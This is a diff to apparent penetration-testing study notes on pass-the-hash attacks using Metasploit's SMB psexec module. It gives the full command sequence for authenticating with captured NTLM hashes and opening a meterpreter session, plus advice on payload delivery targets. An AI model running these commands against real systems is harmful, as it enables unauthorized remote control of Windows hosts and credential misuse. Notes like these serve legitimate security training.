@@ -1465,33 +1465,34 @@ If you successfully obtain administrative access on a Windows target system, the
 Now we can used the captured NTLM hashes to authenticate with the target legitimately to the service/system.  Tools like the Metasploit PsExec module and CrackMapExec can be used to carry out this type of attack:
 
 ##### Metasploit PxExec
-The `windows/smb/psexec` module in Metasploit is commonly used for pass-the-hash attacks because it interacts with the SMB protocol in Windows networks, allowing for remote execution. The module mimics the legitimate psexec tool to authenticate with the SMB service on a target machine using captured NTLM or LM hashes, bypassing the need for a plain-text password. Once authenticated, the module remotely executes commands or delivers a payload, such as a reverse shell, to gain control of the system. 
+The `exploit/windows/smb/psexec` module in Metasploit is commonly used for pass-the-hash attacks because it interacts with the SMB protocol in Windows networks, allowing for remote execution. The module mimics the legitimate psexec tool to authenticate with the SMB service on a target machine using captured NTLM or LM hashes, bypassing the need for a plain-text password. Once authenticated, the module remotely executes commands or delivers a payload, such as a reverse shell, to gain control of the system. 
 
-1. **Search for the PsExec Module**: Background the existing meterpreter session using `Ctrl+Z`
+1. **Background the existing meterpreter session/Search for the PsExec Module**: Background the existing meterpreter session using `Ctrl+Z`.  You can search for the module with `psexec`. Configure the exploit module and payload options. Also, just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone.
+	- `RHOST` = Target IP
+	- `LPORT`= Your listening port, make sure this doesn't overlap with the local port used for the previous meterpreter session since we're going to be setting up another metrepreter session. (Can check by running `sessions` to see the port used for the session)
+	- `SMBDomain` = If connected to a domain
+	- `SMBUser` / `SMBPass` = The `SMBPass` can accept either the clear-text password or the NTLM hash which is what we'll provide.  Just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone. it would be set as `set SMBPass lm_hash:ntlm_hash`. The LM hash `aad3b435b51404eeaad3b435b51404ee`  is a default "empty" LM hash value, often used when the system doesn't actually use LM hashes which is common with modern system. 
 ```
-search psexec
-```
-We need the `exploit/windows/smb/psexec` exploit. Configure the exploit module and payload options. Also, just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone
-- `RHOST` = Target IP
-- `LPORT`= Your listening port, make sure this doesn't overlap with the local port used for the previous meterpreter session since we're going to be setting up another metrepreter session. (Can check by running `sessions` to see the port used for the session)
-- `SMBDomain` = If connected to a domain
-- `SMBUser` / `SMBPass` = The `SMBPass` can accept either the clear-text password or the NTLM hash which is what we'll provide.  Just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone. it would be set as `set SMBPass lm_hash:ntlm_hash`. The LM hash `aad3b435b51404eeaad3b435b51404ee`  is a default "empty" LM hash value, often used when the system doesn't actually use LM hashes which is common with modern system. 
-```
+(OPTIONAL) search psexec
+
 use exploit/windows/smb/psexec
 set SMBUser <user>
 set SMBPass aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
 set LPORT 4312
+exploit
 ```
 
-This exploit uses SMB to gain remote code execution, there's different methods for delivering and executing the payload on the target system so we might need to specify it specifically here to get a meterpreter session. We can try running `set target` command for `Command` and try setting it as Native upload  to have the  Meterpreter payload uploaded to the target. 
+**Psexec Exploit Module Troubleshooting:** 
+
+If you're having problems with getting a meterpreter session on the target through the exploit, you might need to tweak the target for the exploit. This exploit uses SMB to gain remote code execution, there's different methods for delivering and executing the payload on the target system so we might need to specify it here. In the Metasploit `exploit/windows/smb/psexec` module, the `target` setting determines the method used to deliver and execute the payload on the target system. The available options here include:
+- **Automatic**: The default setting that selects the most appropriate method based on the target system's capabilities. It first checks for PowerShell availability and uses it if present.
+- **PowerShell (Automatic)**: This method uses PowerShell commands to execute the payload directly in memory. PowerShell to be installed on the target system.
+- **Native Upload**: This method uploads the payload as an executable file to a writable directory on the target system (by default, the `SYSTEM32` directory) and then executes it.
+
+So if the default target (Automatic) doesn't work, we can set the target as Native upload  to have the  meterpreter payload uploaded to the target and try running the exploit again Now we can run the exploit.
 ```
 set target Native\ upload
 ```
-Run the exploit
-```
-exploit
-```
-You might need to tweak the target for the exploit, but you should get a meterpreter session.
 
 ##### CrackMapExec
 The other tool for the pass-the-hash attack using the dumped NTLM hashes is `crackmapexec`. Keep in mind this might have issues with python dependencies so you might see errors.
